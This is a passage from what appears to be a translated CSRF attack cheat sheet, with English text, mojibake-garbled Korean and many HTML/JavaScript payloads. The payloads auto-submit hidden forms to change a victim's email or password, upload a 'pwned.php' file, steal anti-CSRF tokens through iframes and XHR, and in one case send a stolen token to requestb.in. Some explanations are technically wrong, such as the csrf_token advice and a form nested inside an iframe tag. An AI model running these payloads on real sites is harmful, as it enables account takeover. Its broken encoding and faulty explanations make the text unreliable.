<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Form POST ìš”ì²­

When a user submits a form on a website, the data is typically sent to the server using a POST request. This is done by specifying the `method` attribute of the HTML form element as `POST`. The form data is then included in the body of the request.

ì‚¬ìš©ìê°€ ì›¹ ì‚¬ì´íŠ¸ì—ì„œ ì–‘ì‹ì„ ì œì¶œí•˜ë©´, ë°ì´í„°ëŠ” ì¼ë°˜ì ìœ¼ë¡œ POST ìš”ì²­ì„ ì‚¬ìš©í•˜ì—¬ ì„œë²„ë¡œ ì „ì†¡ë©ë‹ˆë‹¤. ì´ëŠ” HTML ì–‘ì‹ ìš”ì†Œì˜ `method` ì†ì„±ì„ `POST`ë¡œ ì§€ì •í•¨ìœ¼ë¡œì¨ ìˆ˜í–‰ë©ë‹ˆë‹¤. ì–‘ì‹ ë°ì´í„°ëŠ” ìš”ì²­ì˜ ë³¸ë¬¸ì— í¬í•¨ë©ë‹ˆë‹¤.

```html
<form method="POST" action="/submit-form">
  <input type="text" name="username" />
  <input type="password" name="password" />
  <button type="submit">Submit</button>
</form>
```

In the example above, when the user clicks the "Submit" button, a POST request will be sent to the `/submit-form` endpoint with the form data as the request body. The server can then process this data and perform the necessary actions.

ìœ„ì˜ ì˜ˆì œì—ì„œ ì‚¬ìš©ìê°€ "Submit" ë²„íŠ¼ì„ í´ë¦­í•˜ë©´, ì–‘ì‹ ë°ì´í„°ê°€ ìš”ì²­ ë³¸ë¬¸ìœ¼ë¡œ `/submit-form` ì—”ë“œí¬ì¸íŠ¸ë¡œ POST ìš”ì²­ì´ ì „ì†¡ë©ë‹ˆë‹¤. ì„œë²„ëŠ” ì´ ë°ì´í„°ë¥¼ ì²˜ë¦¬í•˜ê³  í•„ìš”í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframeì„ í†µí•œ Form POST ìš”ì²­

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a user into submitting a form without their knowledge or consent. One way to achieve this is by using an iframe to load a malicious website that contains a form with the desired action and method.

ê³µê²©ìëŠ” ì‚¬ìš©ìë¥¼ ì†ì—¬ ë™ì˜ ì—†ì´ í¼ì„ ì œì¶œí•˜ë„ë¡ ìœ ë„í•˜ì—¬ Cross-Site Request Forgery (CSRF) ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ iframeì„ ì‚¬ìš©í•˜ì—¬ ì›í•˜ëŠ” ë™ì‘ê³¼ ë°©ë²•ì„ ê°€ì§„ ì•…ì„± ì›¹ì‚¬ì´íŠ¸ë¥¼ ë¡œë“œí•˜ëŠ” ë°©ë²•ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://target-website.com/update-profile" method="POST" target="csrf-frame">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="submit" value="Update Profile">
</form>
```

In the above example, the attacker creates an invisible iframe and a form that targets the iframe as the submission target. The form contains hidden input fields with the desired values for the username and email. When the user visits the attacker's website, the form is automatically submitted without their knowledge, sending the forged request to the target website's `/update-profile` endpoint.

ìœ„ì˜ ì˜ˆì‹œì—ì„œ ê³µê²©ìëŠ” ë³´ì´ì§€ ì•ŠëŠ” iframeê³¼ iframeì„ ì œì¶œ ëŒ€ìƒìœ¼ë¡œ í•˜ëŠ” í¼ì„ ìƒì„±í•©ë‹ˆë‹¤. í¼ì—ëŠ” ì‚¬ìš©ì ì´ë¦„ê³¼ ì´ë©”ì¼ì— ëŒ€í•œ ì›í•˜ëŠ” ê°’ì´ ìˆ¨ê²¨ì§„ ì…ë ¥ í•„ë“œë¡œ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì‚¬ìš©ìê°€ ê³µê²©ìì˜ ì›¹ì‚¬ì´íŠ¸ë¥¼ ë°©ë¬¸í•˜ë©´ í¼ì´ ì‚¬ìš©ìì˜ ë™ì˜ ì—†ì´ ìë™ìœ¼ë¡œ ì œì¶œë˜ì–´ ìœ„ì¡°ëœ ìš”ì²­ì´ ëŒ€ìƒ ì›¹ì‚¬ì´íŠ¸ì˜ `/update-profile` ì—”ë“œí¬ì¸íŠ¸ë¡œ ì „ì†¡ë©ë‹ˆë‹¤.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST ìš”ì²­**

Ajax POST ìš”ì²­ì€ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°ì´í„°ë¥¼ ì„œë²„ë¡œ ì „ì†¡í•˜ëŠ” ë°©ë²• ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. ì´ëŸ¬í•œ ìš”ì²­ì€ ì‚¬ìš©ìê°€ ì›¹ í˜ì´ì§€ë¥¼ ìƒˆë¡œ ê³ ì¹˜ì§€ ì•Šê³ ë„ ì„œë²„ì™€ ìƒí˜¸ ì‘ìš©í•  ìˆ˜ ìˆë„ë¡ í•´ì¤ë‹ˆë‹¤. CSRF(Cross-Site Request Forgery) ê³µê²©ì€ ì´ëŸ¬í•œ Ajax POST ìš”ì²­ì„ ì•…ìš©í•˜ì—¬ ì‚¬ìš©ìì˜ ê¶Œí•œìœ¼ë¡œ ì•…ì˜ì ì¸ ë™ì‘ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

ì¼ë°˜ì ìœ¼ë¡œ, ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ì‚¬ìš©ìì˜ ì„¸ì…˜ì„ í™•ì¸í•˜ê¸° ìœ„í•´ ì¿ í‚¤ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ì¿ í‚¤ëŠ” ì‚¬ìš©ìê°€ ë¡œê·¸ì¸í•œ í›„ì— ìƒì„±ë˜ë©°, ì‚¬ìš©ìì˜ ì„¸ì…˜ì„ ì‹ë³„í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. CSRF ê³µê²©ìëŠ” ì´ëŸ¬í•œ ì¿ í‚¤ë¥¼ ì´ìš©í•˜ì—¬ ì‚¬ìš©ìì˜ ê¶Œí•œìœ¼ë¡œ ì•…ì˜ì ì¸ Ajax POST ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

CSRF ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ë³´ì•ˆ í† í°ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ í† í°ì€ ì‚¬ìš©ìì˜ ì„¸ì…˜ê³¼ ì—°ê²°ë˜ì–´ ìˆìœ¼ë©°, ëª¨ë“  Ajax POST ìš”ì²­ì— í¬í•¨ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ì„œë²„ëŠ” ì´ í† í°ì„ ê²€ì¦í•˜ì—¬ ìš”ì²­ì´ ìœ íš¨í•œì§€ í™•ì¸í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ CSRF ê³µê²©ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë”°ë¼ì„œ, ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ê°œë°œí•  ë•ŒëŠ” Ajax POST ìš”ì²­ì— ëŒ€í•œ ë³´ì•ˆ í† í°ì„ êµ¬í˜„í•˜ì—¬ CSRF ê³µê²©ìœ¼ë¡œë¶€í„° ì•ˆì „í•˜ê²Œ ë³´í˜¸í•´ì•¼ í•©ë‹ˆë‹¤.
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST ìš”ì²­

When submitting a form with file uploads, the `multipart/form-data` content type is used. This type of request is commonly used when uploading files or submitting forms that contain binary data.

To perform a `multipart/form-data` POST request, the following steps can be followed:

1. Set the `Content-Type` header to `multipart/form-data`.
2. Create a boundary string that will be used to separate different parts of the request.
3. Construct the request body by appending each part of the request, including the file data, with the appropriate headers and the boundary string.
4. Send the request to the server.

Here is an example of a `multipart/form-data` POST request:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="example.txt"
Content-Type: text/plain

This is the content of the file.

-----------------------------1234567890
Content-Disposition: form-data; name="name"

John Doe
-----------------------------1234567890--
```

In this example, the request body consists of two parts: one for the file upload and another for the form field `name`. Each part is separated by the boundary string `---------------------------1234567890`. The `Content-Disposition` header specifies the name and type of each part.

By understanding how `multipart/form-data` POST requests work, you can effectively interact with web applications that require file uploads or handle binary data.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST ìš”ì²­ v2

In this type of POST request, the data is sent as a series of parts, each containing a set of key-value pairs. This is commonly used when uploading files or submitting forms with complex data.

To perform a CSRF attack on a multipart/form-data POST request, you need to understand the structure of the request and manipulate the values of the key-value pairs.

Here's an example of a multipart/form-data POST request:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="payload.txt"
Content-Type: text/plain

This is the content of the file.

-----------------------------1234567890
Content-Disposition: form-data; name="csrf_token"

attacker-csrf-token
-----------------------------1234567890--
```

To perform a CSRF attack, you would need to change the value of the `csrf_token` field to the attacker's CSRF token. This can be done by intercepting the request and modifying the value before it is sent.

Keep in mind that some websites implement additional security measures to prevent CSRF attacks, such as checking the `Referer` header or using anti-CSRF tokens that are tied to the user's session.
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### iframe ë‚´ì—ì„œì˜ Form POST ìš”ì²­

In some cases, you may encounter a web application that uses an iframe to display content from another domain. This can be a security risk, as an attacker could potentially use this iframe to perform Cross-Site Request Forgery (CSRF) attacks.

ì¼ë¶€ ê²½ìš°ì—ëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ë‹¤ë¥¸ ë„ë©”ì¸ì—ì„œ ë‚´ìš©ì„ í‘œì‹œí•˜ê¸° ìœ„í•´ iframeì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ê²½ìš°, ê³µê²©ìëŠ” ì´ iframeì„ ì´ìš©í•˜ì—¬ Cross-Site Request Forgery (CSRF) ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

To exploit this vulnerability, the attacker can create a form within the iframe and submit it automatically using JavaScript. This form can be designed to perform any action on the target website, such as changing the user's password or making a purchase.

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´, ê³µê²©ìëŠ” iframe ë‚´ì—ì„œ í¼ì„ ìƒì„±í•˜ê³  JavaScriptë¥¼ ì‚¬ìš©í•˜ì—¬ ìë™ìœ¼ë¡œ ì œì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í¼ì€ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ì´ë‚˜ êµ¬ë§¤ ë“± íƒ€ê²Ÿ ì›¹ì‚¬ì´íŠ¸ì—ì„œ ì›í•˜ëŠ” ë™ì‘ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆë„ë¡ ì„¤ê³„ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

To prevent this type of attack, web developers should implement measures such as using anti-CSRF tokens or implementing the SameSite attribute for cookies. Additionally, it is important to ensure that the iframe content is trustworthy and originates from a trusted source.

ì´ëŸ¬í•œ ìœ í˜•ì˜ ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´, ì›¹ ê°œë°œìëŠ” anti-CSRF í† í°ì„ ì‚¬ìš©í•˜ê±°ë‚˜ SameSite ì†ì„±ì„ ì¿ í‚¤ì— êµ¬í˜„í•˜ëŠ” ë“±ì˜ ì¡°ì¹˜ë¥¼ ì·¨í•´ì•¼ í•©ë‹ˆë‹¤. ë˜í•œ, iframe ë‚´ìš©ì´ ì‹ ë¢°í•  ìˆ˜ ìˆê³  ì‹ ë¢°í•  ìˆ˜ ìˆëŠ” ì¶œì²˜ì—ì„œ ë¹„ë¡¯ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRF í† í°ì„ ë„ìš©í•˜ê³  POST ìš”ì²­ ë³´ë‚´ê¸°**

To perform a CSRF attack, you need to steal the CSRF token from the target website and then use it to craft a malicious POST request. Here's how you can do it:

1. **Stealing the CSRF Token**: The CSRF token is typically embedded in the HTML source code of the target website. You can use various techniques like cross-site scripting (XSS) or social engineering to trick the victim into executing a script that extracts the CSRF token. Once you have the token, store it for later use.

2. **Crafting the Malicious POST Request**: With the stolen CSRF token, you can now craft a POST request to perform the desired action on behalf of the victim. Make sure to include all the necessary parameters and values required by the target website. You can use tools like cURL or Burp Suite to send the POST request.

3. **Sending the POST Request**: Once you have crafted the malicious POST request, you need to send it to the target website. This can be done by either submitting a form or by making an AJAX request. The target website will process the request, assuming it is legitimate because it contains the stolen CSRF token.

By successfully executing this attack, you can trick the target website into performing actions on behalf of the victim without their consent. This can lead to various security vulnerabilities, such as changing account settings, making unauthorized transactions, or even gaining administrative access. It is important for web developers to implement proper CSRF protection mechanisms to prevent such attacks.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRF í† í°ì„ ë„ìš©í•˜ê³  iframe, form ë° Ajaxë¥¼ ì‚¬ìš©í•˜ì—¬ POST ìš”ì²­ ë³´ë‚´ê¸°**

In this technique, we will steal the CSRF token from the target website and use it to send a malicious POST request. We will accomplish this by utilizing an iframe, a form, and Ajax.

ì´ ê¸°ìˆ ì—ì„œëŠ” ëŒ€ìƒ ì›¹ ì‚¬ì´íŠ¸ì—ì„œ CSRF í† í°ì„ ë„ìš©í•˜ì—¬ ì•…ì„± POST ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ iframe, form ë° Ajaxë¥¼ í™œìš©í•©ë‹ˆë‹¤.

#### **1. Stealing the CSRF Token**

#### **1. CSRF í† í° ë„ìš©í•˜ê¸°**

To steal the CSRF token, we can use an iframe to load a page from the target website that contains the token. We can then access the token using JavaScript and store it in a variable.

CSRF í† í°ì„ ë„ìš©í•˜ê¸° ìœ„í•´ iframeì„ ì‚¬ìš©í•˜ì—¬ í† í°ì„ í¬í•¨í•˜ëŠ” ëŒ€ìƒ ì›¹ ì‚¬ì´íŠ¸ì˜ í˜ì´ì§€ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ JavaScriptë¥¼ ì‚¬ìš©í•˜ì—¬ í† í°ì— ì•¡ì„¸ìŠ¤í•˜ê³  ë³€ìˆ˜ì— ì €ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```html
<iframe id="csrfFrame" src="https://target-website.com/page-with-token"></iframe>
<script>
    var csrfToken = document.getElementById('csrfFrame').contentWindow.document.getElementById('csrfToken').value;
</script>
```

#### **2. Sending the POST Request**

#### **2. POST ìš”ì²­ ë³´ë‚´ê¸°**

Next, we will use a form to construct the malicious POST request. We will set the action attribute of the form to the target URL and include any necessary input fields.

ë‹¤ìŒìœ¼ë¡œ, ì•…ì„± POST ìš”ì²­ì„ êµ¬ì„±í•˜ê¸° ìœ„í•´ formì„ ì‚¬ìš©í•©ë‹ˆë‹¤. formì˜ action ì†ì„±ì„ ëŒ€ìƒ URLë¡œ ì„¤ì •í•˜ê³  í•„ìš”í•œ ì…ë ¥ í•„ë“œë¥¼ í¬í•¨í•©ë‹ˆë‹¤.

```html
<form id="csrfForm" action="https://target-website.com/post-endpoint" method="POST">
    <input type="hidden" name="csrfToken" value="">
    <input type="hidden" name="payload" value="malicious-payload">
</form>
```

We will then use JavaScript to populate the hidden input field with the stolen CSRF token.

ê·¸ëŸ° ë‹¤ìŒ JavaScriptë¥¼ ì‚¬ìš©í•˜ì—¬ ë„ìš©í•œ CSRF í† í°ìœ¼ë¡œ ìˆ¨ê²¨ì§„ ì…ë ¥ í•„ë“œë¥¼ ì±„ì›ë‹ˆë‹¤.

```html
<script>
    document.getElementById('csrfForm').querySelector('input[name="csrfToken"]').value = csrfToken;
</script>
```

Finally, we will submit the form using JavaScript to send the malicious POST request.

ë§ˆì§€ë§‰ìœ¼ë¡œ, JavaScriptë¥¼ ì‚¬ìš©í•˜ì—¬ ì•…ì„± POST ìš”ì²­ì„ ë³´ë‚´ê¸° ìœ„í•´ formì„ ì œì¶œí•©ë‹ˆë‹¤.

```html
<script>
    document.getElementById('csrfForm').submit();
</script>
```

By combining the iframe, form, and Ajax, we can steal the CSRF token and send a malicious POST request without the user's knowledge.

iframe, form ë° Ajaxë¥¼ ê²°í•©í•˜ì—¬ ì‚¬ìš©ìì˜ ë™ì˜ ì—†ì´ CSRF í† í°ì„ ë„ìš©í•˜ê³  ì•…ì„± POST ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRF í† í°ì„ ë„ìš©í•˜ê³  iframeê³¼ í¼ì„ ì‚¬ìš©í•˜ì—¬ POST ìš”ì²­ ë³´ë‚´ê¸°**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request. One way to achieve this is by using an iframe and a form.

CSRF í† í°ì„ ë„ìš©í•˜ì—¬ ì•…ì„± POST ìš”ì²­ì„ ë³´ë‚´ê¸° ìœ„í•´ í¬ë¡œìŠ¤ ì‚¬ì´íŠ¸ ìš”ì²­ ìœ„ì¡° (CSRF) ê³µê²©ì„ ìˆ˜í–‰í•˜ë ¤ë©´ ëŒ€ìƒ ì›¹ ì‚¬ì´íŠ¸ì—ì„œ CSRF í† í°ì„ ë„ìš©í•œ ë‹¤ìŒ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ iframeê³¼ í¼ì„ ì‚¬ìš©í•˜ëŠ” ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.

First, you need to create an iframe element in your malicious website. Set the source of the iframe to the target website's URL. This will load the target website inside the iframe.

ë¨¼ì €, ì•…ì„± ì›¹ ì‚¬ì´íŠ¸ì—ì„œ iframe ìš”ì†Œë¥¼ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤. iframeì˜ ì†ŒìŠ¤ë¥¼ ëŒ€ìƒ ì›¹ ì‚¬ì´íŠ¸ì˜ URLë¡œ ì„¤ì •í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ iframe ë‚´ì—ì„œ ëŒ€ìƒ ì›¹ ì‚¬ì´íŠ¸ê°€ ë¡œë“œë©ë‹ˆë‹¤.

```html
<iframe src="https://target-website.com"></iframe>
```

Next, you need to create a form element inside the iframe. Set the action attribute of the form to the URL where the POST request should be sent. Include any necessary input fields in the form, such as the target website's login credentials or any other data required for the request.

ë‹¤ìŒìœ¼ë¡œ, iframe ë‚´ë¶€ì— í¼ ìš”ì†Œë¥¼ ìƒì„±í•´ì•¼ í•©ë‹ˆë‹¤. í¼ì˜ action ì†ì„±ì„ POST ìš”ì²­ì„ ë³´ë‚´ì•¼ í•  URLë¡œ ì„¤ì •í•©ë‹ˆë‹¤. í¼ì—ëŠ” ëŒ€ìƒ ì›¹ ì‚¬ì´íŠ¸ì˜ ë¡œê·¸ì¸ ìê²© ì¦ëª… ë˜ëŠ” ìš”ì²­ì— í•„ìš”í•œ ê¸°íƒ€ ë°ì´í„°ì™€ ê°™ì€ í•„ìš”í•œ ì…ë ¥ í•„ë“œë¥¼ í¬í•¨í•´ì•¼ í•©ë‹ˆë‹¤.

```html
<iframe src="https://target-website.com">
  <form action="https://target-website.com/post-endpoint" method="POST">
    <input type="hidden" name="csrf_token" value="stolen-csrf-token">
    <!-- Include any other necessary input fields -->
    <input type="submit" value="Submit">
  </form>
</iframe>
```

Make sure to include a hidden input field named "csrf_token" and set its value to the stolen CSRF token. This will ensure that the POST request includes the valid CSRF token.

"csrf_token"ì´ë¼ëŠ” ìˆ¨ê²¨ì§„ ì…ë ¥ í•„ë“œë¥¼ í¬í•¨í•˜ê³  ê·¸ ê°’ì„ ë„ìš©í•œ CSRF í† í°ìœ¼ë¡œ ì„¤ì •í•˜ëŠ” ê²ƒì„ ìŠì§€ ë§ˆì„¸ìš”. ì´ë ‡ê²Œ í•˜ë©´ POST ìš”ì²­ì— ìœ íš¨í•œ CSRF í† í°ì´ í¬í•¨ë©ë‹ˆë‹¤.

When the malicious website is loaded, the iframe will automatically load the target website and submit the form, sending the POST request with the stolen CSRF token.

ì•…ì„± ì›¹ ì‚¬ì´íŠ¸ê°€ ë¡œë“œë˜ë©´ iframeì´ ìë™ìœ¼ë¡œ ëŒ€ìƒ ì›¹ ì‚¬ì´íŠ¸ë¥¼ ë¡œë“œí•˜ê³  í¼ì„ ì œì¶œí•˜ì—¬ ë„ìš©í•œ CSRF í† í°ê³¼ í•¨ê»˜ POST ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤.
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **í† í°ì„ ë„ìš©í•˜ê³  2ê°œì˜ iframeì„ ì‚¬ìš©í•˜ì—¬ ì „ì†¡í•˜ê¸°**

One way to perform a CSRF attack is by stealing the victim's authentication token and sending it using two iframes. This attack can be executed in the following steps:

1. The attacker creates a malicious website that contains two iframes.
2. The first iframe is loaded with the target website's login page.
3. The second iframe is loaded with a page on the attacker's website that contains a form to perform a specific action on the target website.
4. When the victim visits the malicious website, the first iframe automatically submits the login form using the victim's credentials.
5. Once the victim is logged in, the second iframe automatically submits the form on the attacker's website, which includes the stolen authentication token.
6. The target website receives the request with the stolen token, considering it as a legitimate request from the victim.
7. The action specified in the form on the attacker's website is performed on the target website, potentially leading to unauthorized actions or data leakage.

To prevent this type of attack, web developers should implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict access controls.
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajaxë¥¼ ì‚¬ìš©í•˜ì—¬ CSRF í† í°ì„ ë„ìš©í•˜ê³  í¼ì„ í†µí•´ POST ìš”ì²­ ë³´ë‚´ê¸°**

To perform a Cross-Site Request Forgery (CSRF) attack, you can use Ajax to steal the CSRF token and then send a POST request using a form.

CSRF attacks exploit the trust that a website has in a user's browser. By tricking the browser into making a request on behalf of the user, an attacker can perform actions without the user's knowledge or consent.

To steal the CSRF token, you can use Ajax to make a GET request to the target website's endpoint that returns the token. Once you have the token, you can then use it to craft a POST request.

Here's an example of how you can accomplish this:

```javascript
// Step 1: Steal the CSRF token using Ajax
var xhr = new XMLHttpRequest();
xhr.open('GET', '/endpoint-that-returns-csrf-token', true);
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var csrfToken = xhr.responseText;

    // Step 2: Craft the POST request with the stolen CSRF token
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = '/endpoint-to-submit-form';
    
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'csrf_token';
    input.value = csrfToken;
    
    form.appendChild(input);
    document.body.appendChild(form);
    
    form.submit();
  }
};
xhr.send();
```

In this example, the Ajax request is made to the `/endpoint-that-returns-csrf-token` endpoint, which should return the CSRF token as a response. Once the token is obtained, a new form is created with the necessary input fields, including the stolen CSRF token. Finally, the form is submitted, triggering the POST request with the stolen token.

It's important to note that CSRF attacks can be prevented by implementing proper CSRF protection mechanisms, such as using anti-CSRF tokens, checking the origin of requests, and implementing SameSite cookies.
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
